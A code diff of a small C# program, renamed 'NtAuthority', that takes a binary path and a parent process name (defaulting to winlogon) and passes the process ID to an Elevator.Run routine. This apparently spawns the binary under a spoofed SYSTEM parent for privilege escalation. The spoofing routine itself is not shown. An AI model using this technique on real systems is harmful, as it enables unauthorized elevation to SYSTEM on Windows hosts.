@@ -1,23 +1,19 @@
 ﻿using System.Diagnostics;
 
-namespace GetSystem
+namespace NtAuthority
 {
-    class Program
+  class Program
+  {
+    static void Main(string[] args)
     {
-    
-        
-        static void Main(string[] args)
-        {
-            string binaryPath = args[0];
-            string ProcessToSpoof = args[1];
-            int parentProcessId;
-            Process[] explorerproc = Process.GetProcessesByName(ProcessToSpoof);
-            parentProcessId = explorerproc[0].Id;
-            IamYourDaddy.Run(parentProcessId, binaryPath);
-           
-        }
-
-
-
+      if (args.Length < 1)
+        throw new Exception("Must specify BinPath");
+      string binaryPath = args[0];
+      string ProcessToSpoof = args.Length > 1 ? args[1] : "winlogon";
+      int parentProcessId;
+      Process[] explorerproc = Process.GetProcessesByName(ProcessToSpoof);
+      parentProcessId = explorerproc[0].Id;
+      Elevator.Run(parentProcessId, binaryPath);
     }
+  }
 }
